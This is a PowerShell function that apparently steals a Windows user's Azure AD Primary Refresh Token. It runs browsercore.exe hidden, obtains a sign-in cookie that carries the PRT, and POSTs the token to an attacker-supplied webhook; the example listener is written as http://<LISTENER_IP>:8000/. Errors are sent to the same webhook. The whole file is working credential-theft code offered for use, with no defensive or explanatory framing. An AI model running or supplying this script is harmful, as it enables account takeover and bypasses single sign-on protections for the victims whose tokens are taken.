function Get-UserPRTToken {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $true)]
        [string]$WebhookUrl  # Example: http://<LISTENER_IP>:8000/
    )

    process {
        try {
            # Step 1: Get nonce
            $nonceResp = Invoke-RestMethod -Method POST -Uri "https://login.microsoftonline.com/Common/oauth2/token" -Body "grant_type=srv_challenge"
            $nonce = $nonceResp.Nonce
            if (-not $nonce) { throw "Failed to get nonce." }

            # Step 2: Locate browsercore.exe
            $locations = @(
                "$env:ProgramFiles\Windows Security\BrowserCore\browsercore.exe",
                "$env:windir\BrowserCore\browsercore.exe"
            )
            $browserCore = $locations | Where-Object { Test-Path $_ -PathType Leaf } | Select-Object -First 1
            if (-not $browserCore) { throw "BrowserCore.exe not found." }

            # Step 3: Create process
            $p = New-Object System.Diagnostics.Process
            $p.StartInfo.FileName = $browserCore
            $p.StartInfo.UseShellExecute = $false
            $p.StartInfo.RedirectStandardInput = $true
            $p.StartInfo.RedirectStandardOutput = $true
            $p.StartInfo.CreateNoWindow = $true

            # Step 4: Prepare JSON request for BrowserCore
            $json = @"
{
    "method": "GetCookies",
    "uri": "https://login.microsoftonline.com/common/oauth2/authorize?sso_nonce=$nonce",
    "sender": "https://login.microsoftonline.com"
}
"@

            $p.Start() | Out-Null
            $stdin  = $p.StandardInput
            $stdout = $p.StandardOutput

            # Write 4-byte length prefix + JSON payload
            $length = [Text.Encoding]::UTF8.GetByteCount($json)
            $lenBytes = [BitConverter]::GetBytes($length)
            $stdin.BaseStream.Write($lenBytes, 0, 4)
            $stdin.Write($json)
            $stdin.Close()

            # Read response
            $raw = ""
            while (-not $stdout.EndOfStream) {
                $raw += $stdout.ReadLine()
            }
            $p.WaitForExit()

            # Parse JSON
            $jsonStart = $raw.IndexOf("{")
            if ($jsonStart -lt 0) { throw "No JSON found in BrowserCore response." }
            $parsed = $raw.Substring($jsonStart) | ConvertFrom-Json

            if ($parsed.status -eq "Fail") {
                throw "PRT retrieval failed: $($parsed.code) - $($parsed.description)"
            }

            $prtToken = $parsed.response.data
            Write-Host "[+] PRT successfully extracted." -ForegroundColor Green

            # Send PRT token to webhook
            Invoke-RestMethod -Uri $WebhookUrl -Method POST -Body $prtToken -ContentType "text/plain" -UseBasicParsing
            Write-Host "[+] Token sent to webhook successfully." -ForegroundColor Green

            return $prtToken
        }
        catch {
            $err = $_.Exception.Message
            Write-Warning "[!] $err"

            # Send error message to webhook
            Invoke-RestMethod -Uri $WebhookUrl -Method POST -Body "[ERROR] $err" -ContentType "text/plain" -UseBasicParsing -ErrorAction SilentlyContinue
        }
    }
}
